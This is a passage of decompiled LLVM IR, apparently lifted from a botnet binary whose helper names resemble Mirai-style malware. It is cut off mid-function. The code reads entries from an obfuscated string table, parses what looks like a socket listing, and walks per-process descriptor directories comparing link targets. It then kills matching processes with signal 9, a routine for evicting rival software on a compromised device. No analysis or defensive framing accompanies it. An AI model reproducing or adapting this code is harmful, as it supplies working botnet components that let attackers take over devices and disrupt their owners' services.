  %v2_c9f0 = ptrtoint i32* %stack_var_-8777 to i32
  store i32 %v2_c9f0, i32* @fp, align 4
  %v4_c9fc = call i32 @__GI_memset(i8* nonnull %stack_var_-585, i32 0, i32 513)
  %v2_ca00 = ptrtoint i32* %stack_var_-4681 to i32
  store i32 %v2_ca00, i32* @sl, align 4
  %v0_ca04 = load i32, i32* @r5, align 4
  %v3_ca10 = bitcast i32* %stack_var_-8777 to i8*
  %v4_ca10 = call i32 @__GI_memset(i8* %v3_ca10, i32 %v0_ca04, i32 4096)
  %v0_ca18 = load i32, i32* @r5, align 4
  %v3_ca24 = bitcast i32* %stack_var_-4681 to i8*
  %v4_ca24 = call i32 @__GI_memset(i8* %v3_ca24, i32 %v0_ca18, i32 4096)
  %v2_ca28 = ptrtoint i8* %stack_var_-72 to i32
  store i32 %v2_ca28, i32* @sb, align 4
  %v0_ca2c = load i32, i32* %r4.global-to-local, align 4
  %v3_ca2c = udiv i32 %v0_ca2c, 256
  %v1_ca30 = urem i32 %v0_ca2c, 256
  store i32 %v1_ca30, i32* @r4, align 4
  %v3_ca40 = trunc i32 %v3_ca2c to i8
  %v4_ca40 = call i32 @util_itoa(i8 %v3_ca40, i32 16, i32 %v2_ca28)
  %v2_ca48 = call i32 @util_strlen(i8* nonnull %stack_var_-72)
  %v7_ca4c = icmp eq i32 %v2_ca48, 2
  br i1 %v7_ca4c, label %dec_label_pc_cf10, label %dec_label_pc_ca54

dec_label_pc_ca54:                                ; preds = %entry, %dec_label_pc_cf10
  %v1_ca58 = call i32 @table_unlock_val(i32 15)
  %v1_ca60 = call i32 @table_unlock_val(i32 16)
  %v1_ca68 = call i32 @table_unlock_val(i32 17)
  %v1_ca70 = call i32 @table_unlock_val(i32 19)
  %v0_ca74 = load i32, i32* @r5, align 4
  %v2_ca7c = inttoptr i32 %v0_ca74 to i32*
  %v3_ca7c = call i32 @table_retrieve_val(i32 19, i32* %v2_ca7c)
  %v0_ca80 = load i32, i32* @r5, align 4
  %v2_ca84 = inttoptr i32 %v0_ca80 to i32*
  %v3_ca84 = call i32 @__libc_open(i32 %v3_ca7c, i32* %v2_ca84)
  %v7_ca88 = icmp eq i32 %v3_ca84, -1
  store i32 %v3_ca84, i32* @r8, align 4
  br i1 %v7_ca88, label %bb, label %dec_label_pc_ca98.preheader

bb:                                               ; preds = %dec_label_pc_ca54
  %v1_ca90 = load i32, i32* @r5, align 4
  store i32 %v1_ca90, i32* @r4, align 4
  br label %dec_label_pc_ceac

dec_label_pc_ca98.preheader:                      ; preds = %dec_label_pc_ca54
  %v4_caa456 = call i32 @util_fdgets(i8* nonnull %stack_var_-585, i32 512, i32 %v3_ca84)
  %v2_caa858 = icmp eq i32 %v4_caa456, 0
  br i1 %v2_caa858, label %dec_label_pc_cc30.loopexit, label %dec_label_pc_cab0.lr.ph

dec_label_pc_cab0.lr.ph:                          ; preds = %dec_label_pc_ca98.preheader
  %v2_caf8 = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_cab0

dec_label_pc_cab0:                                ; preds = %dec_label_pc_cab0.lr.ph, %dec_label_pc_ca98.backedge
  %v3_cab4 = load i8, i8* %stack_var_-585, align 1
  %v4_cab4 = sext i8 %v3_cab4 to i32
  store i32 %v4_cab4, i32* @r3, align 4
  %v2_cab8 = icmp eq i8 %v3_cab4, 0
  br i1 %v2_cab8, label %bb126, label %bb125

bb125:                                            ; preds = %dec_label_pc_cab0
  %v8_cabc = icmp eq i8 %v3_cab4, 58
  br i1 %v8_cabc, label %.thread8, label %dec_label_pc_cad0

.thread8:                                         ; preds = %bb125
  br label %dec_label_pc_cae8

bb126:                                            ; preds = %dec_label_pc_cab0
  br label %dec_label_pc_cae8

dec_label_pc_cad0:                                ; preds = %bb125
  %v1_cad8.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_cad4

dec_label_pc_cad4:                                ; preds = %bb127, %dec_label_pc_cad0
  %v0_cad4 = phi i32 [ %v1_cad4, %bb127 ], [ 0, %dec_label_pc_cad0 ]
  %v1_cad4 = add i32 %v0_cad4, 1
  %v2_cad8 = add i32 %v1_cad4, %v1_cad8.pre
  %v3_cad8 = inttoptr i32 %v2_cad8 to i8*
  %v4_cad8 = load i8, i8* %v3_cad8, align 1
  %v6_cad8 = zext i8 %v4_cad8 to i32
  store i32 %v6_cad8, i32* @r3, align 4
  %v2_cadc = icmp eq i8 %v4_cad8, 0
  br i1 %v2_cadc, label %dec_label_pc_cae8, label %bb127

bb127:                                            ; preds = %dec_label_pc_cad4
  %v8_cae0 = icmp eq i8 %v4_cad8, 58
  br i1 %v8_cae0, label %dec_label_pc_cae8, label %dec_label_pc_cad4

dec_label_pc_cae8:                                ; preds = %dec_label_pc_cad4, %bb127, %bb126, %.thread8
  %v1_cb14 = phi i32 [ 0, %.thread8 ], [ 0, %bb126 ], [ %v1_cad4, %bb127 ], [ %v1_cad4, %dec_label_pc_cad4 ]
  %v0_cae8 = phi i32 [ %v4_cab4, %.thread8 ], [ %v4_cab4, %bb126 ], [ %v6_cad8, %bb127 ], [ %v6_cad8, %dec_label_pc_cad4 ]
  %v2_cae8 = icmp eq i32 %v0_cae8, 0
  br i1 %v2_cae8, label %dec_label_pc_ca98.backedge, label %dec_label_pc_caf0

dec_label_pc_ca98.backedge:                       ; preds = %dec_label_pc_cae8, %dec_label_pc_cbb8, %dec_label_pc_cc04, %dec_label_pc_cb34
  %v0_caa0 = load i32, i32* @r8, align 4
  %v4_caa4 = call i32 @util_fdgets(i8* nonnull %stack_var_-585, i32 512, i32 %v0_caa0)
  %v2_caa8 = icmp eq i32 %v4_caa4, 0
  br i1 %v2_caa8, label %dec_label_pc_cc30.loopexit, label %dec_label_pc_cab0

dec_label_pc_caf0:                                ; preds = %dec_label_pc_cae8
  %v1_caf4 = add i32 %v1_cb14, 2
  %v2_cafc = add i32 %v1_caf4, %v2_caf8
  %v1_cb00 = add i32 %v2_cafc, -545
  %v2_cb00 = inttoptr i32 %v1_cb00 to i8*
  %v3_cb00 = load i8, i8* %v2_cb00, align 1
  %v2_cb04 = icmp eq i8 %v3_cb00, 0
  br i1 %v2_cb04, label %bb129, label %bb128

bb128:                                            ; preds = %dec_label_pc_caf0
  %v8_cb08 = icmp eq i8 %v3_cb00, 32
  br i1 %v8_cb08, label %.thread13, label %dec_label_pc_cb14

.thread13:                                        ; preds = %bb128
  store i32 %v1_caf4, i32* @r5, align 4
  br label %dec_label_pc_cb34

bb129:                                            ; preds = %dec_label_pc_caf0
  store i32 %v1_caf4, i32* @r5, align 4
  br label %dec_label_pc_cb34

dec_label_pc_cb14:                                ; preds = %bb128
  %v0_cb14 = load i32, i32* @r6, align 4
  %v2_cb14 = add i32 %v0_cb14, %v1_cb14
  br label %dec_label_pc_cb1c

dec_label_pc_cb1c:                                ; preds = %bb130, %dec_label_pc_cb14
  %v0_cb2816 = phi i32 [ %v1_cb28, %bb130 ], [ %v1_caf4, %dec_label_pc_cb14 ]
  %v0_cb2c18 = phi i32 [ %v1_cb2c, %bb130 ], [ %v2_cb14, %dec_label_pc_cb14 ]
  %v1_cb1c = add i32 %v0_cb2c18, 3
  %v2_cb1c = inttoptr i32 %v1_cb1c to i8*
  %v3_cb1c = load i8, i8* %v2_cb1c, align 1
  %v2_cb20 = icmp eq i8 %v3_cb1c, 0
  br i1 %v2_cb20, label %.thread15, label %bb130

.thread15:                                        ; preds = %dec_label_pc_cb1c
  %v1_cb2817 = add i32 %v0_cb2816, 1
  store i32 %v1_cb2817, i32* @r5, align 4
  br label %dec_label_pc_cb34

bb130:                                            ; preds = %dec_label_pc_cb1c
  %v8_cb24 = icmp eq i8 %v3_cb1c, 32
  %v1_cb28 = add i32 %v0_cb2816, 1
  store i32 %v1_cb28, i32* @r5, align 4
  %v1_cb2c = add i32 %v0_cb2c18, 1
  br i1 %v8_cb24, label %dec_label_pc_cb34, label %dec_label_pc_cb1c

dec_label_pc_cb34:                                ; preds = %bb130, %bb129, %.thread15, %.thread13
  %v1_cb40 = phi i32 [ %v1_cb2817, %.thread15 ], [ %v1_caf4, %.thread13 ], [ %v1_caf4, %bb129 ], [ %v1_cb28, %bb130 ]
  %v0_cb34 = load i32, i32* @r6, align 4
  %v2_cb34 = add i32 %v0_cb34, %v1_caf4
  store i32 %v2_cb34, i32* @r4, align 4
  %v2_cb40 = add i32 %v1_cb40, %v2_caf8
  store i32 0, i32* @r7, align 4
  %v3_cb48 = add i32 %v2_cb40, -545
  %v4_cb48 = inttoptr i32 %v3_cb48 to i8*
  store i8 0, i8* %v4_cb48, align 1
  %v0_cb4c = load i32, i32* @r4, align 4
  %v1_cb50 = inttoptr i32 %v0_cb4c to i8*
  %v2_cb50 = call i32 @util_strlen(i8* %v1_cb50)
  store i32 %v2_cb50, i32* @r1, align 4
  %v0_cb5c = load i32, i32* @r4, align 4
  %v3_cb60 = inttoptr i32 %v0_cb5c to i8*
  %v4_cb60 = call i32 @util_stristr(i8* %v3_cb60, i32 %v2_cb50, i32 %v2_ca28)
  %v7_cb64 = icmp eq i32 %v4_cb60, -1
  br i1 %v7_cb64, label %dec_label_pc_ca98.backedge, label %dec_label_pc_cb80.preheader

dec_label_pc_cb80.preheader:                      ; preds = %dec_label_pc_cb34
  %v1_cb68 = load i32, i32* @r7, align 4
  %v1_cb6c = load i32, i32* @r6, align 4
  %v2_cb6c = load i32, i32* @r5, align 4
  %v3_cb6c = add i32 %v2_cb6c, %v1_cb6c
  store i32 %v1_cb68, i32* @lr, align 4
  %v1_cb8048 = add i32 %v3_cb6c, 2
  %v2_cb8049 = inttoptr i32 %v1_cb8048 to i8*
  %v3_cb8050 = load i8, i8* %v2_cb8049, align 1
  %v4_cb8051 = zext i8 %v3_cb8050 to i32
  store i32 %v4_cb8051, i32* @r3, align 4
  %v2_cb8452 = icmp eq i8 %v3_cb8050, 0
  %v1_cb8854 = add i32 %v2_cb6c, 2
  br i1 %v2_cb8452, label %dec_label_pc_cbb8, label %dec_label_pc_cb90

dec_label_pc_cb90:                                ; preds = %dec_label_pc_cb80.preheader, %dec_label_pc_cb80.backedge
  %v0_cbb883 = phi i32 [ %v0_cbb881, %dec_label_pc_cb80.backedge ], [ %v1_cb68, %dec_label_pc_cb80.preheader ]
  %v0_cba0.pr = phi i32 [ %v0_cba0.pr70, %dec_label_pc_cb80.backedge ], [ %v1_cb68, %dec_label_pc_cb80.preheader ]
  %v0_cec0 = phi i32 [ %v0_cec073, %dec_label_pc_cb80.backedge ], [ %v1_cb68, %dec_label_pc_cb80.preheader ]
  %v0_cb8878 = phi i32 [ %v1_cb88, %dec_label_pc_cb80.backedge ], [ %v1_cb8854, %dec_label_pc_cb80.preheader ]
  %v0_cbb0 = phi i32 [ %v0_cb80, %dec_label_pc_cb80.backedge ], [ %v3_cb6c, %dec_label_pc_cb80.preheader ]
  %v1_cb94 = phi i32 [ %v4_cb80, %dec_label_pc_cb80.backedge ], [ %v4_cb8051, %dec_label_pc_cb80.preheader ]
  %v7_cb90 = icmp eq i32 %v1_cb94, 9
  br i1 %v7_cb90, label %bb132, label %bb131

bb131:                                            ; preds = %dec_label_pc_cb90
  %v8_cb94 = icmp eq i32 %v1_cb94, 32
  br i1 %v8_cb94, label %.thread27, label %dec_label_pc_cba0

.thread27:                                        ; preds = %bb131
  br label %dec_label_pc_cbac

bb132:                                            ; preds = %dec_label_pc_cb90
  br label %dec_label_pc_cbac

dec_label_pc_cba0:                                ; preds = %bb131
  %v7_cba0 = icmp eq i32 %v0_cba0.pr, 1
  br i1 %v7_cba0, label %dec_label_pc_cec0, label %dec_label_pc_cba8

dec_label_pc_cba8:                                ; preds = %dec_label_pc_cec0, %dec_label_pc_cba0
  %v0_cbac75 = phi i32 [ %v1_cec0, %dec_label_pc_cec0 ], [ %v0_cec0, %dec_label_pc_cba0 ]
  br label %dec_label_pc_cbac

dec_label_pc_cbac:                                ; preds = %bb132, %.thread27, %dec_label_pc_cba8
  %v0_cbac = phi i32 [ %v0_cec0, %.thread27 ], [ %v0_cec0, %bb132 ], [ %v0_cbac75, %dec_label_pc_cba8 ]
  %v0_cba0.pr71 = phi i32 [ 1, %.thread27 ], [ 1, %bb132 ], [ 0, %dec_label_pc_cba8 ]
  %v7_cbb4 = icmp sgt i32 %v0_cbac, 6
  br i1 %v7_cbb4, label %dec_label_pc_cbb8, label %dec_label_pc_cb80.backedge

dec_label_pc_cbb8:                                ; preds = %dec_label_pc_cb80.backedge, %dec_label_pc_cbac, %dec_label_pc_cb80.preheader
  %v1_cc08 = phi i32 [ %v1_cb8854, %dec_label_pc_cb80.preheader ], [ %v1_cb88, %dec_label_pc_cb80.backedge ], [ %v0_cb8878, %dec_label_pc_cbac ]
  %v0_cbb8 = phi i32 [ %v1_cb68, %dec_label_pc_cb80.preheader ], [ %v0_cbb881, %dec_label_pc_cb80.backedge ], [ %v0_cbb883, %dec_label_pc_cbac ]
  %v2_cbb8 = icmp eq i32 %v0_cbb8, 0
  br i1 %v2_cbb8, label %dec_label_pc_ca98.backedge, label %dec_label_pc_cbc4

dec_label_pc_cbc4:                                ; preds = %dec_label_pc_cbb8
  %v2_cbcc = add i32 %v1_cc08, %v2_caf8
  %v1_cbd0 = add i32 %v2_cbcc, -545
  %v2_cbd0 = inttoptr i32 %v1_cbd0 to i8*
  %v3_cbd0 = load i8, i8* %v2_cbd0, align 1
  %v2_cbd4 = icmp eq i8 %v3_cbd0, 0
  br i1 %v2_cbd4, label %dec_label_pc_cc04, label %bb133

bb133:                                            ; preds = %dec_label_pc_cbc4
  %v8_cbd8 = icmp eq i8 %v3_cbd0, 32
  br i1 %v8_cbd8, label %dec_label_pc_cc04, label %dec_label_pc_cbe0

dec_label_pc_cbe0:                                ; preds = %bb133
  %v2_cbe0 = add i32 %v1_cc08, %v1_cb6c
  br label %dec_label_pc_cbe4

dec_label_pc_cbe4:                                ; preds = %bb134, %dec_label_pc_cbe0
  %v0_cbf030 = phi i32 [ %v1_cbf0, %bb134 ], [ %v1_cc08, %dec_label_pc_cbe0 ]
  %v0_cbe4 = phi i32 [ %v1_cbe4, %bb134 ], [ %v2_cbe0, %dec_label_pc_cbe0 ]
  %v1_cbe4 = add i32 %v0_cbe4, 1
  %v2_cbe4 = inttoptr i32 %v1_cbe4 to i8*
  %v3_cbe4 = load i8, i8* %v2_cbe4, align 1
  %v2_cbe8 = icmp eq i8 %v3_cbe4, 0
  br i1 %v2_cbe8, label %.thread29, label %bb134

.thread29:                                        ; preds = %dec_label_pc_cbe4
  %v1_cbf031 = add i32 %v0_cbf030, 1
  br label %dec_label_pc_cbf8

bb134:                                            ; preds = %dec_label_pc_cbe4
  %v8_cbec = icmp eq i8 %v3_cbe4, 32
  %v1_cbf0 = add i32 %v0_cbf030, 1
  br i1 %v8_cbec, label %dec_label_pc_cbf8, label %dec_label_pc_cbe4

dec_label_pc_cbf8:                                ; preds = %bb134, %.thread29
  %v1_cc00 = phi i32 [ %v1_cbf031, %.thread29 ], [ %v1_cbf0, %bb134 ]
  %v2_cc00 = add i32 %v1_cc00, %v2_caf8
  br label %dec_label_pc_cc04

dec_label_pc_cc04:                                ; preds = %dec_label_pc_cbc4, %bb133, %dec_label_pc_cbf8
  %v2_cc10 = phi i32 [ %v2_cbcc, %dec_label_pc_cbc4 ], [ %v2_cbcc, %bb133 ], [ %v2_cc00, %dec_label_pc_cbf8 ]
  %v2_cc08 = add i32 %v1_cc08, %v1_cb6c
  store i32 %v2_cc08, i32* @r4, align 4
  %v3_cc10 = add i32 %v2_cc10, -545
  %v4_cc10 = inttoptr i32 %v3_cc10 to i8*
  store i8 0, i8* %v4_cc10, align 1
  %v1_cc14 = inttoptr i32 %v2_cc08 to i8*
  %v2_cc14 = call i32 @util_strlen(i8* %v1_cc14)
  %v8_cc1c = icmp sgt i32 %v2_cc14, 15
  br i1 %v8_cc1c, label %dec_label_pc_ca98.backedge, label %dec_label_pc_cc20

dec_label_pc_cc20:                                ; preds = %dec_label_pc_cc04
  %v0_cc24 = load i32, i32* @r4, align 4
  %v2_cc28 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_cc28, i32* @r0, align 4
  %v2_cc2c = bitcast i32* %stack_var_-56 to i8*
  %v3_cc2c = call i32 @util_strcpy(i8* %v2_cc2c, i32 %v0_cc24)
  br label %dec_label_pc_cc30

dec_label_pc_cc30.loopexit:                       ; preds = %dec_label_pc_ca98.backedge, %dec_label_pc_ca98.preheader
  %.pre = ptrtoint i32* %stack_var_-56 to i32
  %.pre92 = bitcast i32* %stack_var_-56 to i8*
  br label %dec_label_pc_cc30

dec_label_pc_cc30:                                ; preds = %dec_label_pc_cc30.loopexit, %dec_label_pc_cc20
  %v1_cc40.pre-phi = phi i8* [ %.pre92, %dec_label_pc_cc30.loopexit ], [ %v2_cc2c, %dec_label_pc_cc20 ]
  %v2_cc3c.pre-phi = phi i32 [ %.pre, %dec_label_pc_cc30.loopexit ], [ %v2_cc28, %dec_label_pc_cc20 ]
  %v0_cc30 = load i32, i32* @r8, align 4
  %v1_cc34 = call i32 @__GI___libc_close(i32 %v0_cc30)
  %v2_cc40 = call i32 @util_strlen(i8* %v1_cc40.pre-phi)
  store i32 %v2_cc40, i32* @r4, align 4
  %v2_cc44 = icmp eq i32 %v2_cc40, 0
  br i1 %v2_cc44, label %dec_label_pc_ceec, label %dec_label_pc_cc4c

dec_label_pc_cc4c:                                ; preds = %dec_label_pc_cc30
  %v3_cc54 = call i32 @table_retrieve_val(i32 15, i32* null)
  %v1_cc58 = call i32 @__GI_opendir(i32 %v3_cc54)
  store i32 %v1_cc58, i32* @sb, align 4
  %v2_cc5c = icmp eq i32 %v1_cc58, 0
  br i1 %v2_cc5c, label %dec_label_pc_ce8c, label %dec_label_pc_cc6c.preheader

dec_label_pc_cc6c.preheader:                      ; preds = %dec_label_pc_cc4c
  store i32 0, i32* @r5, align 4
  %v1_cc7043 = inttoptr i32 %v1_cc58 to i32*
  %v2_cc7044 = call i32 @__GI_readdir(i32* %v1_cc7043)
  %v2_cc7446 = icmp eq i32 %v2_cc7044, 0
  br i1 %v2_cc7446, label %dec_label_pc_ce80, label %dec_label_pc_cc7c.preheader

dec_label_pc_cc6c.loopexit:                       ; preds = %dec_label_pc_cc84, %dec_label_pc_cc94, %dec_label_pc_cd00
  %v0_cc6c = load i32, i32* @sb, align 4
  %v1_cc70 = inttoptr i32 %v0_cc6c to i32*
  %v2_cc70 = call i32 @__GI_readdir(i32* %v1_cc70)
  %v2_cc74 = icmp eq i32 %v2_cc70, 0
  br i1 %v2_cc74, label %dec_label_pc_ce80, label %dec_label_pc_cc7c.preheader

dec_label_pc_cc7c.preheader:                      ; preds = %dec_label_pc_cc6c.preheader, %dec_label_pc_cc6c.loopexit
  %v0_cc8491 = phi i32 [ %v2_cc70, %dec_label_pc_cc6c.loopexit ], [ %v2_cc7044, %dec_label_pc_cc6c.preheader ]
  br label %dec_label_pc_cc7c

dec_label_pc_cc7c:                                ; preds = %dec_label_pc_cc7c.preheader, %dec_label_pc_ce68
  %v0_cc9c = phi i32 [ %v0_cc8491, %dec_label_pc_cc7c.preheader ], [ %v2_ce74, %dec_label_pc_ce68 ]
  %v0_cc7c = load i32, i32* @r5, align 4
  %v2_cc7c = icmp eq i32 %v0_cc7c, 0
  br i1 %v2_cc7c, label %dec_label_pc_cc84, label %dec_label_pc_ce80

dec_label_pc_cc84:                                ; preds = %dec_label_pc_cc7c
  %v1_cc84 = add i32 %v0_cc9c, 11
  %v2_cc84 = inttoptr i32 %v1_cc84 to i8*
  %v3_cc84 = load i8, i8* %v2_cc84, align 1
  %v4_cc84 = zext i8 %v3_cc84 to i32
  %v1_cc88 = add nsw i32 %v4_cc84, -48
  %tmp = icmp ugt i32 %v1_cc88, 9
  br i1 %tmp, label %dec_label_pc_cc6c.loopexit, label %dec_label_pc_cc94

dec_label_pc_cc94:                                ; preds = %dec_label_pc_cc84
  store i32 %v1_cc84, i32* @r7, align 4
  %v3_cca0 = call i32 @table_retrieve_val(i32 15, i32* null)
  store i32 %v2_ca00, i32* @r0, align 4
  %v3_ccac = call i32 @util_strcpy(i8* %v3_ca24, i32 %v3_cca0)
  %v2_ccb4 = call i32 @util_strlen(i8* %v3_ca24)
  %v0_ccb8 = load i32, i32* @r7, align 4
  %v1_ccbc = load i32, i32* @sl, align 4
  %v2_ccbc = add i32 %v1_ccbc, %v2_ccb4
  store i32 %v2_ccbc, i32* @r0, align 4
  %v2_ccc0 = inttoptr i32 %v2_ccbc to i8*
  %v3_ccc0 = call i32 @util_strcpy(i8* %v2_ccc0, i32 %v0_ccb8)
  %v2_ccc8 = call i32 @util_strlen(i8* %v3_ca24)
  %v0_cccc = load i32, i32* @r5, align 4
  store i32 %v2_ccc8, i32* @r4, align 4
  %v2_ccd8 = inttoptr i32 %v0_cccc to i32*
  %v3_ccd8 = call i32 @table_retrieve_val(i32 16, i32* %v2_ccd8)
  %v0_cce0 = load i32, i32* @r4, align 4
  %v1_cce0 = load i32, i32* @sl, align 4
  %v2_cce0 = add i32 %v1_cce0, %v0_cce0
  store i32 %v2_cce0, i32* @r0, align 4
  %v2_cce4 = inttoptr i32 %v2_cce0 to i8*
  %v3_cce4 = call i32 @util_strcpy(i8* %v2_cce4, i32 %v3_ccd8)
  %v3_ccf4 = call i32 @readlink(i32 %v2_ca00, i32 %v2_c9f0, i32 4096)
  %v7_ccf8 = icmp eq i32 %v3_ccf4, -1
  br i1 %v7_ccf8, label %dec_label_pc_cc6c.loopexit, label %dec_label_pc_cd00

dec_label_pc_cd00:                                ; preds = %dec_label_pc_cc94
  %v0_cd00 = load i32, i32* @r5, align 4
  %v2_cd08 = inttoptr i32 %v0_cd00 to i32*
  %v3_cd08 = call i32 @table_retrieve_val(i32 15, i32* %v2_cd08)
  store i32 %v2_ca00, i32* @r0, align 4
  %v3_cd14 = call i32 @util_strcpy(i8* %v3_ca24, i32 %v3_cd08)
  %v2_cd1c = call i32 @util_strlen(i8* %v3_ca24)
  %v0_cd20 = load i32, i32* @r7, align 4
  %v1_cd24 = load i32, i32* @sl, align 4
  %v2_cd24 = add i32 %v1_cd24, %v2_cd1c
  store i32 %v2_cd24, i32* @r0, align 4
  %v2_cd28 = inttoptr i32 %v2_cd24 to i8*
  %v3_cd28 = call i32 @util_strcpy(i8* %v2_cd28, i32 %v0_cd20)
  %v2_cd30 = call i32 @util_strlen(i8* %v3_ca24)
  %v0_cd34 = load i32, i32* @r5, align 4
  store i32 %v2_cd30, i32* @r4, align 4
  %v2_cd40 = inttoptr i32 %v0_cd34 to i32*
  %v3_cd40 = call i32 @table_retrieve_val(i32 17, i32* %v2_cd40)
  %v0_cd48 = load i32, i32* @r4, align 4
  %v1_cd48 = load i32, i32* @sl, align 4
  %v2_cd48 = add i32 %v1_cd48, %v0_cd48
  store i32 %v2_cd48, i32* @r0, align 4
  %v2_cd4c = inttoptr i32 %v2_cd48 to i8*
  %v3_cd4c = call i32 @util_strcpy(i8* %v2_cd4c, i32 %v3_cd40)
  %v1_cd54 = call i32 @__GI_opendir(i32 %v2_ca00)
  store i32 %v1_cd54, i32* @r8, align 4
  %v2_cd58 = icmp eq i32 %v1_cd54, 0
  br i1 %v2_cd58, label %dec_label_pc_cc6c.loopexit, label %dec_label_pc_cd60.preheader

dec_label_pc_cd60.preheader:                      ; preds = %dec_label_pc_cd00
  %v1_cd6438 = inttoptr i32 %v1_cd54 to i32*
  %v2_cd6439 = call i32 @__GI_readdir(i32* %v1_cd6438)
  store i32 %v2_cd6439, i32* @r6, align 4
  %v2_cd6841 = icmp eq i32 %v2_cd6439, 0
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c9f0, i32* @r0, align 4
  br i1 %v2_cd6841, label %dec_label_pc_ce68, label %dec_label_pc_cd78thread-pre-split

dec_label_pc_cd60.loopexit:                       ; preds = %dec_label_pc_cd80, %dec_label_pc_ce18
  %v0_cd60 = load i32, i32* @r8, align 4
  %v1_cd64 = inttoptr i32 %v0_cd60 to i32*
  %v2_cd64 = call i32 @__GI_readdir(i32* %v1_cd64)
  store i32 %v2_cd64, i32* @r6, align 4
  %v2_cd68 = icmp eq i32 %v2_cd64, 0
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c9f0, i32* @r0, align 4
  br i1 %v2_cd68, label %dec_label_pc_ce68, label %dec_label_pc_cd78thread-pre-split

dec_label_pc_cd78thread-pre-split:                ; preds = %dec_label_pc_cd60.preheader, %dec_label_pc_cd60.loopexit
  %v0_cd78.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_cd78

dec_label_pc_cd78:                                ; preds = %dec_label_pc_cd78thread-pre-split, %dec_label_pc_ce40
  %v0_cd78 = phi i32 [ %v0_cd78.pr, %dec_label_pc_cd78thread-pre-split ], [ 1, %dec_label_pc_ce40 ]
  %v2_cd78 = icmp eq i32 %v0_cd78, 0
  br i1 %v2_cd78, label %dec_label_pc_cd80, label %dec_label_pc_ce68

dec_label_pc_cd80:                                ; preds = %dec_label_pc_cd78
  %v0_cd80 = call i32 @util_zero()
  %v0_cd84 = load i32, i32* @r5, align 4
  %v2_cd8c = inttoptr i32 %v0_cd84 to i32*
  %v3_cd8c = call i32 @table_retrieve_val(i32 15, i32* %v2_cd8c)
  store i32 %v2_ca00, i32* @r0, align 4
  %v3_cd98 = call i32 @util_strcpy(i8* %v3_ca24, i32 %v3_cd8c)
  %v2_cda0 = call i32 @util_strlen(i8* %v3_ca24)
  %v0_cda4 = load i32, i32* @r7, align 4
  %v1_cda8 = load i32, i32* @sl, align 4
  %v2_cda8 = add i32 %v1_cda8, %v2_cda0
  store i32 %v2_cda8, i32* @r0, align 4
  %v2_cdac = inttoptr i32 %v2_cda8 to i8*
  %v3_cdac = call i32 @util_strcpy(i8* %v2_cdac, i32 %v0_cda4)
  %v2_cdb4 = call i32 @util_strlen(i8* %v3_ca24)
  %v0_cdb8 = load i32, i32* @r5, align 4
  store i32 %v2_cdb4, i32* @r4, align 4
  %v2_cdc4 = inttoptr i32 %v0_cdb8 to i32*
  %v3_cdc4 = call i32 @table_retrieve_val(i32 17, i32* %v2_cdc4)
  %v0_cdcc = load i32, i32* @r4, align 4
  %v1_cdcc = load i32, i32* @sl, align 4
  %v2_cdcc = add i32 %v1_cdcc, %v0_cdcc
  store i32 %v2_cdcc, i32* @r0, align 4
  %v2_cdd0 = inttoptr i32 %v2_cdcc to i8*
  %v3_cdd0 = call i32 @util_strcpy(i8* %v2_cdd0, i32 %v3_cdc4)
  %v2_cdd8 = call i32 @util_strlen(i8* %v3_ca24)
  %v1_cde0 = load i32, i32* @sl, align 4
  %v2_cde0 = add i32 %v1_cde0, %v2_cdd8
  store i32 %v2_cde0, i32* @r0, align 4
  %v2_cde4 = inttoptr i32 %v2_cde0 to i8*
  %v3_cde4 = call i32 @util_strcpy(i8* %v2_cde4, i32 ptrtoint (i32* @global_var_195f8.73 to i32))
  %v2_cdec = call i32 @util_strlen(i8* %v3_ca24)
  %v0_cdf0 = load i32, i32* @r6, align 4
  %v1_cdf0 = add i32 %v0_cdf0, 11
  %v1_cdf4 = load i32, i32* @sl, align 4
  %v2_cdf4 = add i32 %v1_cdf4, %v2_cdec
  store i32 %v2_cdf4, i32* @r0, align 4
  %v2_cdf8 = inttoptr i32 %v2_cdf4 to i8*
  %v3_cdf8 = call i32 @util_strcpy(i8* %v2_cdf8, i32 %v1_cdf0)
  %v3_ce08 = call i32 @readlink(i32 %v2_ca00, i32 %v2_c9f0, i32 4096)
  %v7_ce0c = icmp eq i32 %v3_ce08, -1
  br i1 %v7_ce0c, label %dec_label_pc_cd60.loopexit, label %dec_label_pc_ce18

dec_label_pc_ce18:                                ; preds = %dec_label_pc_cd80
  %v2_ce18 = call i32 @util_strlen(i8* %v3_ca10)
  store i32 %v2_ce18, i32* @r1, align 4
  %v4_ce2c = call i32 @util_stristr(i8* %v3_ca10, i32 %v2_ce18, i32 %v2_cc3c.pre-phi)
  %v7_ce30 = icmp eq i32 %v4_ce2c, -1
  br i1 %v7_ce30, label %dec_label_pc_cd60.loopexit, label %dec_label_pc_ce40

dec_label_pc_ce40:                                ; preds = %dec_label_pc_ce18
  %v0_ce38 = load i32, i32* @r7, align 4
  %v2_ce40 = inttoptr i32 %v0_ce38 to i8*
  %v3_ce40 = call i32 @util_atoi(i8* %v2_ce40, i32 10)
  %v2_ce48 = call i32 @kill(i32 %v3_ce40, i32 9)
  %v0_ce4c = load i32, i32* @r8, align 4
  %v1_ce50 = inttoptr i32 %v0_ce4c to i32*
  %v2_ce50 = call i32 @__GI_readdir(i32* %v1_ce50)
  store i32 %v2_ce50, i32* @r6, align 4
  %v2_ce54 = icmp eq i32 %v2_ce50, 0
  store i32 1, i32* @r5, align 4
  store i32 4096, i32* @r1, align 4
  store i32 %v2_c9f0, i32* @r0, align 4
  br i1 %v2_ce54, label %dec_label_pc_ce68, label %dec_label_pc_cd78

dec_label_pc_ce68:                                ; preds = %dec_label_pc_cd60.loopexit, %dec_label_pc_ce40, %dec_label_pc_cd78, %dec_label_pc_cd60.preheader
  %v0_ce68 = load i32, i32* @r8, align 4
  %v1_ce6c = inttoptr i32 %v0_ce68 to i32*
  %v2_ce6c = call i32 @__GI_closedir(i32* %v1_ce6c)
  %v0_ce70 = load i32, i32* @sb, align 4
  %v1_ce74 = inttoptr i32 %v0_ce70 to i32*
  %v2_ce74 = call i32 @__GI_readdir(i32* %v1_ce74)
  %v2_ce78 = icmp eq i32 %v2_ce74, 0
  br i1 %v2_ce78, label %dec_label_pc_ce80, label %dec_label_pc_cc7c

dec_label_pc_ce80:                                ; preds = %dec_label_pc_cc6c.loopexit, %dec_label_pc_ce68, %dec_label_pc_cc7c, %dec_label_pc_cc6c.preheader
